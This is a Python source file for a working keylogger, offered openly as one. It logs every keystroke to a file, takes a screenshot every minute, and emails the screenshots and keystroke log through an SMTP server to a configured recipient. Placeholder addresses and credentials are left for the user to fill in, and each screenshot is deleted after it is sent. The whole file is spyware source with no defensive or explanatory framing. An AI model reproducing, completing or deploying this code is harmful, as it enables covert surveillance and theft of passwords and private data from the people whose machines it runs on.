import pyautogui
import datetime
import threading
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.log = ""
        self.log_file = "log.txt"
        self.screenshot_interval = 60  # in seconds
        self.log_interval = 60  # in seconds
        self.screenshot_count = 1
        self.email_from = "sender@mail.com"  # Update with sender's email address
        self.email_to = "recipient@mail.com"  # Update with recipient's email address
        self.email_subject = "Keylogger Report"

    def write_log(self, key):
        self.log += key

    def write_to_file(self):
        with open(self.log_file, "a") as f:
            f.write(self.log)
        self.log = ""

    def capture_screenshot(self):
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot = pyautogui.screenshot()
        screenshot_path = f'screenshot_{timestamp}.png'
        screenshot.save(screenshot_path)
        self.screenshot_count += 1
        self.send_email(screenshot_path)

    def send_email(self, attachment_path):
        # Create the email message
        msg = MIMEMultipart()
        msg['From'] = self.email_from
        msg['To'] = self.email_to
        msg['Subject'] = self.email_subject

        # Attach the log file to the email
        with open(self.log_file, 'rb') as file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(file.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f'attachment; filename="{self.log_file}"')
            msg.attach(attachment)

        # Attach the screenshot to the email
        with open(attachment_path, 'rb') as file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(file.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f'attachment; filename="{attachment_path}"')
            msg.attach(attachment)

        # Configure the SMTP server details
        smtp_server = "smtp.example.com"  # Update with the SMTP server address
        smtp_port = 587  # Update with the SMTP server port
        smtp_username = "YOUR-SMTP-USERNAME"  # Update with your SMTP server username
        smtp_password = "YOUR-SMPT-PASSWORD"  # Update with your SMTP server password

        try:
            # Connect to the SMTP server, send the email, and close the connection
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(smtp_username, smtp_password)
            server.sendmail(self.email_from, self.email_to, msg.as_string())
            server.quit()
        except Exception as e:
            print(f"Error sending email: {e}")

        # Remove the screenshot file
        os.remove(attachment_path)

    def on_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            else:
                current_key = f" {str(key)} "

        self.write_log(current_key)

    def key_logger_thread(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            while True:
                self.write_to_file()
                time.sleep(self.log_interval)

    def capture_screenshot_thread(self):
        while True:
            self.capture_screenshot()
            time.sleep(self.screenshot_interval)

    def start(self):
        t1 = threading.Thread(target=self.key_logger_thread)
        t1.start()
        t2 = threading.Thread(target=self.capture_screenshot_thread)
        t2.start()
        t1.join()
        t2.join()

# Create an instance of the Keylogger class and start the keylogger
keylogger = Keylogger()
keylogger.start()